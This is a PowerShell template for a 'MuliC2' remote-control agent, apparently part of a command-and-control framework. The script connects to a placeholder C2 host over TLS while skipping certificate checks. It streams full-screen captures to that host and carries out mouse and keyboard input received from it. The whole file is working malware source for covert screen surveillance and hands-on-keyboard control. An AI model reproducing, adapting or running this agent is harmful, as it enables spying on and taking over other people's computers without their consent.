# MuliC2 VNC Screen Capture Agent
# C2 Host: {{C2_HOST}}
# C2 Port: {{C2_PORT}}
# Generated: {{GENERATED_DATE}}

param(
    [string]$C2Host = "{{C2_HOST}}",
    [int]$C2Port = {{C2_PORT}}
)

try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    Write-Host "[+] Required assemblies loaded successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Error loading required assemblies: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure you're running on a system with GUI support" -ForegroundColor Red
    exit 1
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    public const int MOUSEEVENTF_MOVE = 0x0001;
    public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const int MOUSEEVENTF_LEFTUP = 0x0004;
    public const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const int MOUSEEVENTF_RIGHTUP = 0x0010;
    public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
    public const int MOUSEEVENTF_WHEEL = 0x0800;
    public const uint KEYEVENTF_KEYUP = 0x0002;
    public const uint KEYEVENTF_UNICODE = 0x0004;
}
"@

function Invoke-MouseEvent {
    param(
        [string]$event,
        [float]$x,
        [float]$y,
        [int]$button = 0,
        [int]$buttons = 0
    )
    try {
        $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        $px = [int]($x * $realScreenWidth)
        $py = [int]($y * $realScreenHeight)
        Write-Host "[*] Mouse event: $event at screen coords ($px, $py) from relative ($x, $y) [real screen: ${realScreenWidth}x${realScreenHeight}]" -ForegroundColor Cyan
        [Win32API]::SetCursorPos($px, $py)
        switch ($event) {
            'mousedown' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0); Write-Host "[+] Left mouse button down" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, $px, $py, 0, 0); Write-Host "[+] Right mouse button down" -ForegroundColor Green }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, $px, $py, 0, 0); Write-Host "[+] Middle mouse button down" -ForegroundColor Green }
                }
            }
            'mouseup' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0); Write-Host "[+] Left mouse button up" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, $px, $py, 0, 0); Write-Host "[+] Right mouse button up" -ForegroundColor Green }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, $px, $py, 0, 0); Write-Host "[+] Middle mouse button up" -ForegroundColor Green }
                }
            }
            'click' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0); Start-Sleep -Milliseconds 50; [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0); Write-Host "[+] Left click executed" -ForegroundColor Green }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, $px, $py, 0, 0); Start-Sleep -Milliseconds 50; [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, $px, $py, 0, 0); Write-Host "[+] Right click executed" -ForegroundColor Green }
                }
            }
            'dblclick' {
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0)
                Start-Sleep -Milliseconds 50
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, $px, $py, 0, 0)
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, $px, $py, 0, 0)
                Write-Host "[+] Double click executed" -ForegroundColor Green
            }
        }
    } catch {
        Write-Host "[!] Mouse event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-KeyboardEvent {
    param(
        [string]$event,
        [string]$key,
        [string]$code,
        [int]$keyCode,
        [bool]$ctrlKey = $false,
        [bool]$shiftKey = $false,
        [bool]$altKey = $false
    )
    try {
        Write-Host "[*] Keyboard event: $event - Key: '$key' Code: '$code' KeyCode: $keyCode" -ForegroundColor Cyan
        
        # Handle modifier keys first
        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero) }
        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, 0, [UIntPtr]::Zero) }
        if ($altKey) { [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero) }
        
        $vkCode = 0
        switch ($key) {
            'Enter' { $vkCode = 0x0D }
            'Escape' { $vkCode = 0x1B }
            'Backspace' { $vkCode = 0x08 }
            'Tab' { $vkCode = 0x09 }
            'Delete' { $vkCode = 0x2E }
            'ArrowUp' { $vkCode = 0x26 }
            'ArrowDown' { $vkCode = 0x28 }
            'ArrowLeft' { $vkCode = 0x25 }
            'ArrowRight' { $vkCode = 0x27 }
            'Home' { $vkCode = 0x24 }
            'End' { $vkCode = 0x23 }
            'PageUp' { $vkCode = 0x21 }
            'PageDown' { $vkCode = 0x22 }
            'Insert' { $vkCode = 0x2D }
            'F1' { $vkCode = 0x70 }
            'F2' { $vkCode = 0x71 }
            'F3' { $vkCode = 0x72 }
            'F4' { $vkCode = 0x73 }
            'F5' { $vkCode = 0x74 }
            'F6' { $vkCode = 0x75 }
            'F7' { $vkCode = 0x76 }
            'F8' { $vkCode = 0x77 }
            'F9' { $vkCode = 0x78 }
            'F10' { $vkCode = 0x79 }
            'F11' { $vkCode = 0x7A }
            'F12' { $vkCode = 0x7B }
            'Control' { $vkCode = 0x11 }
            'Alt' { $vkCode = 0x12 }
            'Shift' { $vkCode = 0x10 }
            default {
                if ($key.Length -eq 1) {
                    $vkCode = [Win32API]::VkKeyScan($key[0]) -band 0xFF
                } elseif ($keyCode -ne 0) {
                    $vkCode = $keyCode
                }
            }
        }
        
        if ($vkCode -ne 0) {
            if ($event -eq 'keydown') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
                Write-Host "[+] Key down: $key (VK: $vkCode)" -ForegroundColor Green
            } elseif ($event -eq 'keyup') {
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
                Write-Host "[+] Key up: $key (VK: $vkCode)" -ForegroundColor Green
            }
        } else {
            if ($key.Length -eq 1) {
                [System.Windows.Forms.SendKeys]::SendWait($key)
                Write-Host "[+] Character sent via SendKeys: $key" -ForegroundColor Green
            } else {
                Write-Host "[!] Could not simulate key: $key" -ForegroundColor Red
            }
        }
        
        # Release modifier keys
        if ($altKey) { [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        
    } catch {
        Write-Host "[!] Keyboard event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Start-Cleanup {
    if ($global:cleanupInProgress) { return }
    $global:cleanupInProgress = $true
    $global:isRunning = $false
    
    Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
    
    try {
        if ($global:inputJob -and $global:inputJob.State -eq 'Running') {
            Write-Host "[*] Stopping input job..." -ForegroundColor Yellow
            Stop-Job $global:inputJob -Force
            Remove-Job $global:inputJob -Force
        }
    } catch {
        Write-Host "[!] Error cleaning up job: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    try {
        if ($global:sslStream) {
            $global:sslStream.Close()
            $global:sslStream.Dispose()
        }
    } catch {
        Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    try {
        if ($global:tcpClient) {
            $global:tcpClient.Close()
            $global:tcpClient.Dispose()
        }
    } catch {
        Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
}

# Set up cleanup on exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup }
$null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
    Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
    Start-Cleanup
    [System.Environment]::Exit(0)
}

$global:tcpClient = $null
$global:sslStream = $null
$global:isRunning = $true
$global:cleanupInProgress = $false
$global:inputJob = $null

try {
    Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
    $global:tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
    $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne(10000, $false)
    if (-not $waitSuccess -or -not $global:tcpClient.Connected) {
        throw "Connection to $C2Host`:$C2Port failed or timed out"
    }
    $global:tcpClient.EndConnect($asyncResult)
    Write-Host "[+] TCP connection established" -ForegroundColor Green
    
    $socket = $global:tcpClient.Client
    $socket.ReceiveTimeout = -1
    $socket.SendTimeout = 30000
    $socket.NoDelay = $true
    
    $global:sslStream = New-Object System.Net.Security.SslStream(
        $global:tcpClient.GetStream(),
        $false,
        ([System.Net.Security.RemoteCertificateValidationCallback] { param($sender, $certificate, $chain, $sslPolicyErrors) return $true })
    )
    
    try {
        $global:sslStream.AuthenticateAsClient($C2Host)
    } catch {
        throw "SSL authentication failed: $($_.Exception.Message)"
    }
    
    if (-not $global:sslStream.IsAuthenticated) {
        throw "SSL authentication failed - stream not authenticated"
    }
    
    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
    Write-Host "[*] Capturing 800x600 resolution at 5 FPS" -ForegroundColor Gray

    # Create input job with proper scope and error handling
    $global:inputJob = Start-Job -ScriptBlock {
        param($sslStreamArg, $functions)
        
        # Import functions into job scope
        . ([ScriptBlock]::Create($functions))
        
        Write-Host "[*] Input event listener job started" -ForegroundColor Magenta
        
        try {
            while ($true) {
                try {
                    # Read message length header
                    $lengthBytes = New-Object byte[] 4
                    $totalRead = 0
                    while ($totalRead -lt 4) {
                        $bytesRead = $sslStreamArg.Read($lengthBytes, $totalRead, 4 - $totalRead)
                        if ($bytesRead -eq 0) { throw "Connection closed by server" }
                        $totalRead += $bytesRead
                    }
                    
                    $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
                    if ($msgLength -le 0 -or $msgLength -gt 8192) { 
                        Write-Host "[!] Invalid message length: $msgLength" -ForegroundColor Red
                        continue 
                    }
                    
                    # Read message data
                    $msgBytes = New-Object byte[] $msgLength
                    $totalRead = 0
                    while ($totalRead -lt $msgLength) {
                        $bytesRead = $sslStreamArg.Read($msgBytes, $totalRead, $msgLength - $totalRead)
                        if ($bytesRead -eq 0) { throw "Connection closed by server" }
                        $totalRead += $bytesRead
                    }
                    
                    $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
                    Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
                    
                    try { 
                        $event = $json | ConvertFrom-Json 
                    } catch { 
                        Write-Host "[!] Failed to parse input event JSON: $json" -ForegroundColor Red 
                        continue
                    }
                    
                    if ($event) {
                        if ($event.type -eq 'mouse') {
                            Invoke-MouseEvent $event.event $event.x $event.y $event.button
                        } elseif ($event.type -eq 'keyboard') {
                            Invoke-KeyboardEvent $event.event $event.key $event.code $event.keyCode $event.ctrlKey $event.shiftKey $event.altKey
                        } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
                            try {
                                Add-Type -AssemblyName System.Windows.Forms
                                [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
                                Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
                            } catch {
                                Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                    }
                } catch {
                    Write-Host "[!] Exception in input event processing: $($_.Exception.Message)" -ForegroundColor Red
                    Start-Sleep -Milliseconds 100
                }
            }
        } catch {
            Write-Host "[!] Fatal exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host $_.ScriptStackTrace -ForegroundColor Red
        }
    } -ArgumentList $global:sslStream, (Get-Content Function:\Invoke-MouseEvent, Function:\Invoke-KeyboardEvent | Out-String)

    # Screen Capture and Frame Sending Loop
    try {
        $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        $targetWidth = 800
        $targetHeight = 600
        
        Write-Host "[*] Real screen resolution: ${realScreenWidth}x${realScreenHeight}" -ForegroundColor Gray
        Write-Host "[*] Capture resolution: ${targetWidth}x${targetHeight}" -ForegroundColor Gray
        
        while ($global:isRunning -and $global:sslStream.IsAuthenticated) {
            try {
                # Capture full screen and scale to target resolution
                $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
                $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
                $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
                
                $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $frameBytes = $ms.ToArray()
                
                # Clean up resources immediately
                $ms.Dispose()
                $graphics.Dispose()
                $bmp.Dispose()
                $graphicsFull.Dispose()
                $bmpFull.Dispose()
                
                # Send frame with 4-byte little-endian length header
                $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
                $global:sslStream.Write($lenBytes, 0, 4)
                $global:sslStream.Write($frameBytes, 0, $frameBytes.Length)
                $global:sslStream.Flush()
                
                Start-Sleep -Milliseconds 200  # ~5 FPS
                
            } catch {
                Write-Host "[!] Exception in screen capture iteration: $($_.Exception.Message)" -ForegroundColor Red
                Start-Sleep -Milliseconds 1000
            }
        }
    } catch {
        Write-Host "[!] Exception in screen capture loop: $($_.Exception.Message)" -ForegroundColor Red
    }
    
} catch {
    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
} finally {
    Start-Cleanup
}